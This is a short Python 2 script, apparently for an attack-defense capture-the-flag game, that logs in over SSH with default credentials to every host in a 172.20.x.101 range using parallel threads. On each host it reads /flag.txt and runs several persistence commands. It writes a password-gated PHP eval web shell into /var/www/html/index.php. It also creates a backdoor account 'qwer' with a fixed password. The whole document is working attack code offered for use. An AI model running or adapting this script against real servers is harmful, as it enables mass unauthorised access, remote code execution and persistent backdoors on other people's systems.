#-*- coding: utf-8 -*-
#!/usr/bin/python 
import paramiko
import threading
 
def ssh2(ip,username,passwd,cmd):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,22,username,passwd,timeout=5)
        #ssh.connect(ip,22,username,passwd,timeout=50)
        for m in cmd:
            stdin, stdout, stderr = ssh.exec_command(m)
#           stdin.write("Y")   #简单交互，输入 ‘Y’ 
            out = stdout.readlines()
            #屏幕输出
            for o in out:
                #print o,
                print o+"("+ip+")"+"\n"
        print '%s\tOK\n'%(ip)
        ssh.close()
    except :
        print '%s\tError\n'%(ip)
 
if __name__=='__main__':
    cmd1="cat /etc/passwd"
    cmd2="echo \'<?php if(md5($_GET[\'guo\'])===\"f11487ed3a8dedaddaf0999baf85bd17\"){@eval($_POST['cmd']);} ?>\' >/var/www/html/temp123123.php "
    cmd2="echo \'<script language=\"PHP\"> if(md5($_GET[\'guo\'])===\"f11487ed3a8dedaddaf0999baf85bd17\"){@eval($_POST[\'cmd\']);} </script>\' >> /var/www/html/index.php"
    cmd3="adduser qwer" #增加账户qwer
    cmd4="echo \"123123123\"|passwd --stdin qwer"  #设置该账户的密码为123123123
    #你要执行的命令列表
    cmd = ["cat /flag.txt",cmd2,'cat /var/www/html/temp123123.php',cmd3,cmd4]
    
    username = "admin"  #用户名
    passwd = "123456"    #密码
    threads = [100]   #多线程
    print "Begin......"
 
    for i in range(1,256):
          #  ip="192.168.32.167"
        #ip = '192.168.50.'+str(i)
        ip = "172.20."+str(i)+".101"
        a=threading.Thread(target=ssh2,args=(ip,username,passwd,cmd))
        a.start()